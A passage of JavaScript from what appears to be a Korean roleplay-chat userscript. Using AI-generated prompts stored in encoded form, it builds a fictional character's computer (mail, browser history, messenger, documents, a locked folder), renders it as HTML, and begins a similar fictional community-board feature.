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');
  const pcs = async chatId => { try { return JSON.parse(String(await getValue('pc:' + chatId, '{}')) || '{}'); } catch (_) { return {}; } };
  let pcData = {};
  async function makePc(name, from = 0, to = 0, update = false) {
    const chatId = chatIdFromPath(); if (!chatId || busyNow || !snapshot) return;
    const upd = update && pcData[name] ? pcData[name] : null; if (upd) { from = recUpto(upd) + 1; to = turnEnd(); if (from > to) { toast('지난번 뒤로 새 대화가 없어요.', 'info', 2500); return; } }
    busyNow = true; startGen('pc'); render(); toast(`${josa(name, '이', '가')} 컴퓨터를 켜는 중이에요… (30초~1분)`);
    try {
      const users = [...PROF.entries()].filter(([, v]) => v.isUser).map(([n]) => n);
      const ph = phoneData[name]?.data, phone = ph ? `[이 인물의 폰 — 같은 사람답게 이어지게] 씀씀이 ${ph.bank?.spend || '-'} · 메모 ${(ph.memo || []).map(t => t.title).slice(0, 8).join('/') || '-'} · 검색 ${(ph.search || []).map(t => t.q).slice(0, 6).join('/') || '-'}\n` : '';
      const others = Object.entries(pcData).filter(([n]) => n !== name).map(([n, r]) => `${n}: ${r.data?.os || '-'} · 바탕화면 ${(r.data?.desktop || []).map(x => x.name).slice(0, 6).join('/') || '-'} · 메일 ${(r.data?.mail || []).map(x => x.subject).slice(0, 4).join('/') || '-'}`).join('\n');
      const raw = await askModelRetry(withRules(PC_PROMPT, ETC_LANG + etcRoll(true)), `[인물] ${name}\n${users.length ? `[유저] ${users.join(', ')} — 이 사람과의 일은 노트에 있던 일만, 이 사람이 보낸 메일·메시지를 지어내지 말 것\n` : '[유저] 노트에 표시 없음 — RP 상대로 보이는 주인공과의 일은 노트에 있던 일만\n'}${phone}\n${others ? `[이미 만든 다른 인물의 컴퓨터 — 이것과 겹치지 않게]\n${others}\n\n` : ''}${await etcLog(chatId, from, to, '이 장면들에서 이 인물이 겪고 느낀 일을 컴퓨터 속(검색·메일·문서·파일·메신저 등)에 특히 많이 반영할 것. 유저가 보낸 메일·메시지는 지어내지 말 것')}${upd ? updateAsk(upd, '컴퓨터') : ''}`, `💻${name}${upd ? ' 갱신' : ''}`);
      let data; try { data = parseJsonLoose(raw); } catch (_) { throw new Error('AI 답을 읽지 못했어요. 한 번 더 눌러 주세요.'); }
      pcData = await pcs(chatId); pcData[name] = { at: Date.now(), turns: snapshot.note?.turns || 0, from: upd ? upd.from : from, to, upto: to || turnEnd(), data: upd ? mergeRec(upd.data, data) : data };
      await setValue('pc:' + chatId, JSON.stringify(pcData));
      nav.pcScreen = 'home'; toast(`${name}의 컴퓨터가 켜졌어요 💻`, 'ok', 2500);
    } catch (e) { toast('컴퓨터 만들기 실패 · ' + errMsg(e), 'err'); }
    finally { busyNow = false; render(); }
  }
  // 유저와의 방·유저가 보낸 메일은 화면에서 뺍니다 (폰의 scrubUser와 같은 생각)
  function scrubPcUser(d0) {
    const users = [...PROF.entries()].filter(([, v]) => v.isUser).map(([n]) => n);
    if (!users.length || !d0) return d0;
    const isU = x => { const k = String(x || '').trim(); return !!k && users.some(u => k === u || canon(k) === u || personAlias(u).includes(k)); };
    return { ...d0, chat: (d0.chat || []).filter(c => !isU(c.with)).map(c => ({ ...c, thread: (c.thread || []).filter(x => x.me || !isU(x.from)) })),
      mail: (d0.mail || []).filter(m => !isU(m.from)) };
  }
  // 바탕화면 앱: [키, 이름, 아이콘, 데이터에 있는지]
  const PC_APPS = [
    ['browser', '브라우저', '🌐', d => (d.browser?.tabs || []).length || (d.browser?.history || []).length],
    ['mail', '메일', '✉️', d => (d.mail || []).length], ['docs', '문서', '📁', d => (d.docs || []).length],
    ['chat', '메신저', '💬', d => (d.chat || []).length], ['calendar', '캘린더', '📅', d => (d.calendar || []).length],
    ['photos', '사진', '🖼️', d => (d.photos || []).length], ['watch', '시청 기록', '▶️', d => (d.watch || []).length],
    ['cart', '장바구니', '🛒', d => (d.cart || []).length], ['locked', '잠긴 폴더', '🔒', d => d.locked?.files?.length],
    ['trash', '휴지통', '🗑️', d => (d.trash || []).length],
  ];
  const FILE_ICON = { folder: '📁', doc: '📄', img: '🖼️', zip: '🗜️', app: '🧩' };
  function pcHtml() {
    if (!snapshot?.note && !freshTurns()) return devSeg() + emptyBox('아직 대화가 없어요.');
    const names = etcPeople(), who = names.includes(nav.phWho) ? nav.phWho : names[0];
    if (!who) return devSeg() + `<div class="bd"><div class="bd-empty"><b>이 세계 사람들의 컴퓨터</b><small>고른 대화에 나온 인물들을 한 번에 · AI를 1번 불러요 · 기억 노트엔 안 들어가요</small><button class="ph-make" data-act="npcrange">💻 컴퓨터 켜 보기</button></div></div>${npcSheet()}`;
    nav.phWho = who;
    const picker = `<div class="tl-who">${names.map(n => `<button data-act="phwho" data-arg="${esc(n)}" aria-pressed="${n === who}">${avatar(n)}<small>${esc(n)}</small>${pcData[n] ? '' : '<i class="ph-new">새</i>'}</button>`).join('')}${addBtn()}</div>${nameAdder()}`;
    const rec = pcData[who], d = scrubPcUser(rec?.data || {}), [bg, fg] = avColor(who), clk = phClock();
    const bar = `<div class="pc-bar"><b>${d.os === 'win' ? '⊞' : ''} ${esc(d.login || who)}</b><span>${esc(clk.date)} ${clk.t}</span></div>`;
    const txt = t => String(t || '').split('\n').map(l => `<p>${esc(l) || '&nbsp;'}</p>`).join('');
    const list = (rows, open) => `<div class="pc-list">${rows.map((r, i) => `<button${open ? ` data-act="pcgo" data-arg="${open}:${i}"` : ' disabled'}><b>${r[0]}</b>${r[1] ? `<small>${r[1]}</small>` : ''}${r[2] ? `<em>${r[2]}</em>` : ''}</button>`).join('') || '<p class="pc-empty">비어 있어요</p>'}</div>`;
    const win = (title, body, back = 'home') => `<div class="pc-win"><div class="pc-wt"><i></i><i></i><i></i><button data-act="pcgo" data-arg="${back}">${back === 'home' ? '✕' : '‹ 뒤로'}</button><b>${title}</b></div><div class="pc-wb">${body}</div></div>`;
    let inner = '';
    if (!rec) inner = `<div class="pc-lock" style="--wb:${bg};--wf:${fg}">${avatar(who)}<b>${esc(who)}</b>
        <button class="ph-make" data-act="pcmake" data-arg="${esc(who)}"${busyNow ? ' disabled' : ''}>${busyNow ? '켜는 중…' : '💻 컴퓨터 켜 보기'}</button>
        <small>AI를 1번 불러요 · 노트에 맞춰 성격대로 · 기억 노트엔 안 들어가요</small></div>`;
    else if (d.none) inner = `<div class="pc-lock" style="--wb:${bg};--wf:${fg}"><b>컴퓨터가 없어요</b><small>${esc(d.none)}</small></div>`;
    else {
      const [scr, a] = String(nav.pcScreen || 'home').split(':'), at = Number(a), desk = d.desktop || [], br = d.browser || {}, mails = d.mail || [], docs = d.docs || [], chats = d.chat || [];
      let w = '';
      if (scr === 'file') { const x = desk[at] || {}; w = win(esc(x.name || ''), `<p class="pc-meta">${esc(x.date || '')}</p>${txt(x.body)}`); }
      else if (scr === 'browser') w = win('브라우저', `<p class="pc-h">열린 탭</p>${list((br.tabs || []).map(x => [esc(x.title), esc(x.site)]), 'tab')}
          <p class="pc-h">방문 기록</p>${list((br.history || []).map(x => [`${x.secret ? '🕶️ ' : ''}${esc(x.title)}`, esc(x.site), esc(x.time)]), 'hist')}
          ${(br.bookmarks || []).length ? `<p class="pc-h">즐겨찾기</p>${list(br.bookmarks.map(x => ['⭐ ' + esc(x.title), esc(x.site)]))}` : ''}`);
      else if (scr === 'mail') { const boxes = [...new Set(mails.map(m => m.box || '받은편지함'))];
        w = win('메일', boxes.map(bx => `<p class="pc-h">${esc(bx)}</p><div class="pc-list">${mails.map((m, i) => [m, i]).filter(([m]) => (m.box || '받은편지함') === bx)
          .map(([m, i]) => `<button data-act="pcgo" data-arg="mailv:${i}"><b>${m.unread ? '● ' : ''}${esc(m.subject)}</b><small>${esc(/보낸|임시/.test(bx) ? '받는 사람: ' + (m.to || '') : m.from)}</small><em>${esc(m.time)}</em></button>`).join('')}</div>`).join('')); }
      else if (scr === 'mailv') { const m = mails[at] || {}; w = win(esc(m.subject || ''), `<p class="pc-meta">보낸 사람 ${esc(m.from || '')} · 받는 사람 ${esc(m.to || '')} · ${esc(m.time || '')}</p>${txt(m.body)}`, 'mail'); }
      else if (scr === 'docs') w = win('문서', list(docs.map(x => [`📄 ${esc(x.name)}`, esc(x.folder), esc(x.date)]), 'doc'));
      else if (scr === 'doc') { const x = docs[at] || {}; w = win(esc(x.name || ''), `<p class="pc-meta">${esc(x.folder || '')} · ${esc(x.date || '')}</p>${txt(x.body)}`, 'docs'); }
      else if (scr === 'chat') w = win('메신저', list(chats.map(c => [`${esc(c.with)}`, esc(c.app), esc((c.thread || []).slice(-1)[0]?.text || '')]), 'chatv'));
      else if (scr === 'chatv') { const c = chats[at] || {}; w = win(`${esc(c.with || '')} <small>${esc(c.app || '')}</small>`, `<div class="pc-chat">${(c.thread || []).map(x =>
          `<p class="${x.me ? 'me' : 'them'}">${!x.me && x.from ? `<small>${esc(x.from)}</small>` : ''}${esc(x.text)}<em>${esc(x.time || '')}</em></p>`).join('')}</div>`, 'chat'); }
      else if (scr === 'tab' || scr === 'hist') { const x = (scr === 'tab' ? br.tabs : br.history)?.[at] || {};
        w = win(esc(x.title || ''), `<p class="pc-meta">${x.secret ? '🕶️ 시크릿 창 · ' : ''}${esc(x.site || '')}${x.time ? ' · ' + esc(x.time) : ''}</p>${txt(x.body || '(내용 기록 없음)')}`, 'browser'); }
      else if (scr === 'calendar') w = win('캘린더', list((d.calendar || []).map(x => [esc(x.title), esc(x.note), `${esc(x.date || '')} ${esc(x.time || '')}`])));
      else if (scr === 'photos') w = win('사진', `<div class="pc-photos">${(d.photos || []).map(x => `<figure><span>${esc(x.emoji || '📷')}</span><figcaption>${esc(x.photo || '')}<small>${esc(x.date || '')}</small></figcaption></figure>`).join('')}</div>`);
      else if (scr === 'watch') w = win('시청 기록', list((d.watch || []).map(x => [`▶ ${esc(x.title)}`, `${esc(x.channel)}${x.note ? ' · ' + esc(x.note) : ''}`, esc(x.time)])));
      else if (scr === 'cart') w = win('장바구니', list((d.cart || []).map(x => [esc(x.item), esc(x.note), esc(x.price)])));
      else if (scr === 'trash') w = win('휴지통', list((d.trash || []).map(x => [`🗑 ${esc(x.name)}`, esc(x.note)]), 'trashv'));
      else if (scr === 'trashv') { const x = (d.trash || [])[at] || {}; w = win(esc(x.name || ''), `<p class="pc-meta">${esc(x.note || '')}</p>${txt(x.body)}`, 'trash'); }
      else if (scr === 'locked') w = nav.pcOpen === who
        ? win('🔓 잠긴 폴더', list((d.locked?.files || []).map(x => [esc(x.name), esc(String(x.body || '').slice(0, 40))]), 'lockv'))
        : win('🔒 잠긴 폴더', `<div class="pc-pw"><p>비밀번호 힌트: <b>${esc(d.locked?.hint || '없음')}</b></p><button class="btn sm pri" data-act="pcunlock">몰래 열어 보기</button></div>`);
      else if (scr === 'lockv') { const x = (d.locked?.files || [])[at] || {}; w = win(esc(x.name || ''), txt(x.body), 'locked'); }
      const icons = PC_APPS.filter(([, , , has]) => has(d)).map(([k, l, e]) => `<button class="pc-ic" data-act="pcgo" data-arg="${k}"><i>${e}</i><span>${l}</span></button>`).join('')
        + desk.map((x, i) => `<button class="pc-ic" data-act="pcgo" data-arg="file:${i}"><i>${FILE_ICON[x.kind] || '📄'}</i><span>${esc(x.name)}</span></button>`).join('');
      const sticky = (d.sticky || []).map(s => `<p class="pc-sticky">${esc(s)}</p>`).join('');
      inner = `${bar}<div class="pc-desk" style="--wb:${bg};--wf:${fg}"><span class="pc-wall">${esc(d.wallpaper || '')}</span><div class="pc-icons">${icons}</div>${sticky ? `<div class="pc-stk">${sticky}</div>` : ''}${w}</div>`;
    }
    const foot = rec ? `<p class="muted" style="text-align:center;margin:10px 0 0">${rec.turns}턴 시점에 만든 컴퓨터${rec.from ? ` · ${rec.from}~${rec.to}턴 대화 참고` : ''} · <button class="linkbtn" data-act="devimg" data-arg="pc">이미지로 저장</button> · <button class="linkbtn" data-act="pcmake" data-arg="${esc(who)}"${busyNow ? ' disabled' : ''}>다시 만들기</button>${turnEnd() > recUpto(rec) ? ` · <button class="linkbtn" data-act="pcupd" data-arg="${esc(who)}"${busyNow ? ' disabled' : ''}>새 이야기 반영 (${recUpto(rec) + 1}~${turnEnd()}턴)</button>` : ''}</p>` : '';
    return descHtml('phone') + devSeg() + genCard() + picker + `<div class="pc"><div class="pc-screen">${inner}</div></div><i class="pc-stand"></i>` + foot
      + (nav.bdRange && nav.rgKind === 'pc' && nav.rgWho === who ? rangeSheet(rec ? '다시 만들기' : '만들기') : '') + npcSheet() + devImgSheet();
  }

  // ── 🗨 커뮤니티: 이야기 세계의 커뮤니티 사이트 하나(게시판마다 분위기가 다름). 버튼을 눌렀을 때만 AI 1번, 결과는 이 브라우저에만 ──
  const BOARD_PROMPT = unveil('gevphu/5TyApDd60itzZ60GB8OWD5ekN3q663eD7QYHeyYTc3ca5uN+92k+N78mB8saUp4oQ36PyhOP1jsjTUpWKttyVqobd+Yb60U+Yx5XZmYIWgdzVgfLBT57akdm6phaH481NidD3n/y93oiSFobx8IfV7YT53QMSa9iO2oP32EWG6sqUp4pt3qvyT43p3Yfc9pOZsvKF2ujDi9zRr9ie5JXZnI703YXV7Y/e67DOwbms3pb6g/b9RYbI7JWbghwS3N3XQYHh1YXB/Q3esp7d9OOK/sGB8sZZwaGA2bz+T43WwYbB1pKmut25hoHK3U2I69qe3pXZka4WgcjthvbNhPndAzhr3pHqguPBRYfd8SQnHxDQru9Pjdj5gfXClamSChLa9s+NzeVFg/DVwaiZ3qj6T43X9YbJ35SpghnYhupPjf7RTYXK+e+F276lgNfhgfjtT57Zpdm8shaByO2G9smD1fkN3qW43eD7iubBQ0+e5Y3ekLIWhvLVhsPpg+/9Ddm7u93uy43z4a/YEADGk6wS2vnfjcrlTYPn88eBkB4WhvPBgcXtg+/hDdm8strow6Paievimd6l3q2+9N2C9+SO4vae5KkS3JW2hvnVhufZhcPJxrCoEt3m743mxU2D0uzAp6jekepPjfjvhuXmkqaWHhLa9s+NzeWG5eZZxrCY2aXOg/zZRYfd+5WxjtuTqkqE0tmP3N+Z+7US3LS6gcPZgfnRhNPlDdmjltr370GGwuGC88XGlbwS2/P7jc35gfjiWcGqlNmT0oTqyU2G3MqVsIrcr4JKg/LZRYfX8pWwshDeoeyD/OFMQ2VfWcGukN6W6oP47UWG6sqUp4oQ3qvShM3Rjv7LnuSZEtySqoby3U2I7N9SlLSm3JKqgeTFV0WG/upZwbCc3qvehMTRRYbcylnGmJnYhMOE6tlJTYP/we+F3KWGhvrBTYnw957ygR4Q2aTdhOrZSU2DwvXGr4zevfZDQYb09YPvzQ3ZnIba4MdBgefBg+/NxrGg2bz+T4vd5YHk35WwthDeluuF1tSJze6e5ZHZka4YSoTk1Yjn157uvRLcuZKGz/2GxPFPnuel3qe63ef3QYH40U+e3bwS27CegfzFgfjZT5nKmdiBgt3o90GG9smD7/0N2Ze+2//zQYfX7oPv/Q3ZhrLb+O+Ky8mH3NJZwYSk3o7LgvT1jv33XlnGi7TZhupHjfDdgcjyu5rZibbd2u+N8P1NSJnThdmWthFDg/ztRYHI9pWmltyvskqExvOI8+ee3q0S3Ke8gNzBTYj69JnyidmWnt3P00GBwveE+O3GuZQcPEdPjfPJhsDKWcGopN6w5oTE0UWB6+ySp6bbuZJQT4rHzIfd25KmhvKF2trjivDZgeTuu5rfvooWgN/hhsDZhcrJDd+4ntv780GH3e2txZWKlhDess6Ey+hNNoPw1cGVtAgWiO/HMEyv2J7ZrdiCm9zS76PaifP/nue8Etyvrobkza/Sh9zSlY2n27m/qNiK38WB5daUp4oQ2br5hdntp9qEwuHBkrQS3eb8i9Xlr9ie8pXeq7IWge39TY/V71xzABLcsJqG5MVNj97Pntm4CBDeq9KEzdGJ8PdSk5622oq/qNiNyuSH1/u7mt6Xs9rb6qPaju/3nuSZ8IfekeuD9uin2oP09cG0vfCBgNvhh9bprcWUtYrci5uG8uFNPofXwpW7hxDZs9KC69U4gfjiWcGSsd+o5k+L2t2G4/KSjK4Q3qXehOrJS02E98HAuIjeofpPjfrjhuXmWceBtNiO463WgcLshcrw74XclbeH+smB+O1Pnvql2ZGuFobI4YHz2U+Zz7TerYbaze9BhsL9hcHZARLajptKgvTpiff7n+y12ZmGFoby1YbD6YTV9Q3eo4Lc29+K7/1NSJ79jd6uthGo2EaB5uyFxvkK3oKq3fXTQYbPxYLqwcCnqNiE5k+N/tGG5NZXDdm7lt3P10GB58GE7PXBr4QS2vfbQYH41YTexcGvtBLd3O+KyNGG5eZZwKqI3o/HhO7pRYHyxlnHgbTYjuOt1oHC7IXK8MGloBLdzfGN2/2G5NZXJx8Q3rTGg/zZiOfXUpWwhtuUsqjYi9/pgeTulKGiEN6r3oTH6afahNXpwLqc8IGH9vWBxfGE+O0N3q2GFoby1YHw0YXKycGvqBLa7teL3uGB+OKVqa4Q2bTyg/nFjubLXFnBr4Teo9aF2d2OyueZ8okS3Kuyhs/lgPvlT5nyidmVhtzY409NifPKmdyZ3qmyFoHD1Ybp7YPl6Q3Zl6zd4PtBgd7JhNzdDd+op9vp84rI2U2D+N3BuJTZl/ZPi97FhsrKkqaWHhLc3ddBgeHVhcH9wa+oEtr374370a/YmMqp2Ii79N2DxuyI+MewzsGVsNmc74P86UWB/MaSppYeOBtKhdPhiebzn/W93q2yFoH70E1Wh9/ukoiOENmR5oTyzY7my0hZwayg3qrKrdaB+NiE2PzvhdyvuobI4UWP3+Oe8rHfvKIWhvLVhsPpg+/5Dd6thhaG69mH1umD5ekN2Zes3NjjQYHC/oTi4Q1EWVBTgeX1TYnz/57ljU7cr4OBxeQRifDjnt6tGx4S3Nr2jfDlTYPJ3caclNm94oLq3UWB+vqVuqLctqqB4OVNj9/jnvKx37yi3c3niubBTYTV6cC6nNiG6k+M9PBNhPnVxq+M3qPWT4z4+Ybk1lcnEhDwgUqD//2J8c+wzsGvhdmc71VBhuj5g83Z74XcpZqG5P2v0oHyypWnlt25hobJ6a/ShuvWlbCG3biOh+Pxr9KB+OKUo5ryhdr9z4zh6K/YmcG52a2O2vfXiv75r9ie7r3fs7L03YPY2Yjj97DOxpWo3o/egu/1p9qC+MHBrrTfstpHOUSn2oPq3cCxsN6Jyk+N1sGGwdZZxqGB3qvyT4rK9YDn3lcN3ruu3dPro9qO3eewzsGTgNmX263Wgd7JhNzdwbmtEt3584rL2E2C6+XBqJkcFobx8YH5zYT47Q3erY7a6e6j2onzzpnymfCH363uhdndp9qD1fHGnogS3Nr2jfDlTYL98MaApN+j9k+L1eWG4PZZwbau3qvehdLNRQQfUpW6tNyvukRPjfDQhsX3lbCyENm944TlyYnz657kmRLcr4OBxeRNj9XfmcqV2bu72v3/QQQVTYPn58GsoNmQxk+K/PVNhNXxxqakHDxKT6PaRYHy/pWKsgoS3f77jeb5gfLKla+e3K+Cgfz9TYn405jJifCH3pb/hNL8j93LXlnGkZjZkMaD+tRJTYPvxcaAkB4Wgcb1h9XlQ1KVtr7blb6B/P1Njv7enuS1EtyvuobI4U2Oyv+f8YEIEN6r6oP32UlNhMv9wbS93qDeQ0GB0eWD9sjBgIQeFobr0IHF7E+Z/6DZu4YaSoPA3Y7M3l5ZwK+c2ZfbQ0GH1tGFwNDAp6wS3fnzisvYTYPS+MeFiRLb8/ON98xDT57LsdmAp9v/94vf6UNPmfKk2bSW2vTro9oMHYT47Q3erYfdwOqL3tlNhcLgwa+EHDxHT4rK9YDn3rua3qaG3cXXo9qO3eeZ3qES2oK2hs/Zgf3JhcHZDd+ottrhy43w/U2D9sjGgbTwgYbI4YHywK3FlYqj27mehvLlTY7U65/std+lqt3g+0GGzNWDy9TBr7AS2vnfjcrlTYPn88a4pNm9zkeNzNWGzsNZxr6w3rXrg/ztRYHyxlnBr4Teo9aF2d1Fgen/WcGviNma1q3WgebsguvQBBw6HxaG8tWGz8WC+cnBj6gIFoby1YbPxYPV+e+F3be7huXFgO/VT57kmdmamtvh343Q/YHy8lnBpITerNKEx8GO5/tSlbOi25SahvjxhsLhT57qmdm7lh6G1tWA6/WtxZW6ntyGvoHl9U2P2u+e7pDYgr4aSoTjxYnZ57DOwa+F2Zzvg/ztRYbW9pORntu4okqD+8SO4uuZ2LEeEN6r5oPG7Y7n+1KVjILbk4eo2Iri4Ybf7pW3m9yuioHO/URLTYPhyca4pBLa/P6N8OVNg+f9xqyoEtrJ043vyYHz9lnBlrTeq+5PivnVhsrKkqaWHhLdwMeK/sVNg9b9waWgEtr324rHzYHI8pOdshDZgPOD/dGOxNtSlaaW3b6egeTFQ29AT57sqdm6phaByO2A5NGE1fUN2Zei2//ziubBV0+Ywa3eo4ba99uK/sGB8vJZx4WIEtru14ve4YHy6lnAvbnZhP6C9PFFge3ekrO+26GShvLVhvjRT5nAqdmAsh6G8tmBwu2txZKUttuCtob48YHh8U9Vkoea25SyTYP81UWH3fFQwa+wEt3Ax4rI3Ybk1lcN2byy2uHPQYfX5IPuxcaTrBLd2duN8N1Ng+/F74XctLqBw9mv0oHZ5pWVk9yvtkqD6s2O7/eYy6ES26SWgfzBhu7JR57Pud6Ik9r370GB0/mDytjBgKjZqdZGT2dITYT3wcC4iBLa99eKwdlFISI6BNm/thaG+uWBxtFPmMmt2bGmFoHF0Yb79U+Ywa3erYbd6PdBhun+hcr5wa+0Etr510GB7fVPnuel2buWHobUxYbLyYT58cC5gBLayuuN39GB+OKVqa4QAkhbhdHxSU2FxcHGrYQS2u7ei9/MgfLqWcGviNma1oTG4UtNg+X/wa6M2Z/eT4344YH3+lnBpbbZvP5PjcfYgfLGWcawm9m9zkZbTY/a11KVsIrbnoqG8vlNienemMuE8IfZkfqC6cGn2oP60ceKhBLdzeeN8OmB8sZZwa+w2IHWgv/lRYb87pKyntuwroDd7UNFgfLGkri+EFBPhvjxTY/a11KVsIrbnopKg8H4jt7XmdOo3q22Fob81YbuyUef4LnZmYba/f+N6flNSJ7nvN60g9r0/0GGz92E7OEN2YOG3NLfRobE8YTV9Q3Zg4ba9OtIQ0WH2MpZwa+I2ZrWg/zZRYbF2pKIhtu4okqDwfiO3tuZ87kS3KGGhsjhTYn45Znzudm7lhhgQkGG4NWC+MHBq7AS2vzbi9Xuhu3qkqemEN60xoPqyYnw25n7tRLcsb5KguDdRYHt3pOchhjYhcqE0dyn2oPvzcaBtPCBhszcgfjhrcWVjafcgIJKhdLYj93zW5WwthDZkeaE8smJyu9Slbi427iigeTFQ0WB8s6VrrMQ2I7qrdaB+8yE+c3vhdyVvoHD2a/SgPT2k5WC8oXd3OuK6N1Nhcr574XcpYaG+sFNie7umfKZ8Iffo8GC9eFFgPT2k5WCENml24P87UWB68qTnrbcpaZKhMbzj9/jUpKKutyvuoDU7kNvQE+f5IjZn4rd5eSj2ong37DOx4aE2b3erdaBxfiEwc0N2Iiy9N07LCSn2oTk2MaClRLayvqKy8mv2J/5md6WuvTdhNHVjvLfnvOJ2IK+2vTro9qJystSk5Wy272ySoP//Ynxz5nYgNiCvhaG6/+G7/mE+d0DEt2qsobkxU2J8Nue7JHYiILc2u9BgfDphPnxxq+MEtr320GB4dWFwf3HhrDYhdZPOofd3YPkzA3ZtYrb4Nc8gfj1T57niN62vvTdg/zVjsHTsM7GnozYh96t1oHnwYXDze+F3LS6gcPZgfjpT57ngdmTvt3L80GG3OmC+fnBpIQS2vnbiubBRYXFwQ3erpfa7OON+vVNg+TEwKy8Etze24rm0UFPnuSV2ZyO9N2EzdGP3NtSLWB7HBLa6MOL3NFNhOTYxoKVEtrK+orLyUFPnv2V2IO23N7vQYfS8YPL4A3evYIWgfzQREtNhPfBwLiI3qH6T43644bl5lnAs4AS2ujDjebBgfLyWcCrpd6W/4L09YnK71KVuLjagZZKg9jZjuD7meSR8IfegP6D2cyJ8dOZ2LHZl74WhvzRh9bNQ1KSlLbbgraG8uFNjsrxn+el3peyFob664bv+YT53QM4HRLc2dqNyuWv2J7sodmWjh4EABUEBggcW5WwshDerN6D+eyJ8/9Sk56H3JW2Rk+N8NGG3daUp4ocEsb1+/VNiPjEn+2hEtynuoHJ3UWJ9/ue37US3LCagfHtTY7H35nfgdm6phaG8cSB4+GtxZOdstqAukNDQYHnwYXDzQ3etr/d2dtBh9X0g+/5DdiCsRZYEVWH1fFBUpW3ptyUrkqC9MaI+eNaEUJGQ0JZHhxIgfjtT5jOlRLcto6A3OWB+PVPnueI3ra+9N2F0e2P3+NSSlMH2oKqRk+K6N2A5cqVuqIQ2bTyg/nFRYHx15Wrvtu9skqD5fOO5/uZ8okcOh8WgNfhgfbZg+/Nxr20Etr0/4vV1U2FyvkN2byh3NLvjfr1TYPV+MGSoRLd4dqM+PmG5NZRwKeE2ZzvrdaG1fWEwuzvhdyEooDf4U2J4N9bVw3Yh4rd/+NBAwwOBLDORELbl4pKhdntj97TUpK1o9qCr4by1U2J/tuZ8oka3auigcbVgfL9T1WTlbLcoYKG8tVKRYD+7pWmrtqCtkqE1/SJ8ONbVw3erYfdwOqj2onw457erdm/thaA3+GG5PlPmMqN2bu7HoDcwYHF+E+Z8qTZtJba9OtIgfjpT579s9m6pt3hy09nSE2N6vwN3q2GFobI4YHcxYPl6ca4pBLa8ueN5vlNhN7BwayV3qvuT4rpxoHI8lnBp7reo/KE6slLTYTV6cC6nBLa7suKx+CGyP5ZxoGE2IXKT4va3Ybj8pKMrhDZhMqE4NGJyu9Skoqi2oGWRk+KysGG3fpZwa+EEtr324342YfXwrua3q2GFoby2YbJ0a3FlbCGEN6oz4TI2Yn6/1KSiqzbuKJKg+LlRYbI4pKMrhDepd6E6slLTYXC4MGvsBLdzf+K3+GGyfW7mtiAq9r370GG9vGE1MTBr7QS3NLvisrthuTWWcaiqN+k6oP82Yj4957erRLcp7yB5fWG7slHmfKJ3ruuFoHI7Yb2yU+Z7KHZl7rd4ctBhu7JhNfBDdiCgtzZ04vd5U2E8OHBq7Deo9ZPjPjNREF4VA3Zhrbb6fqK8smG5eZZx4Kw2bf+VUGB3smE3N3GubjfvdpPjc3hgd3Glbqi3LaqSoTX6Yju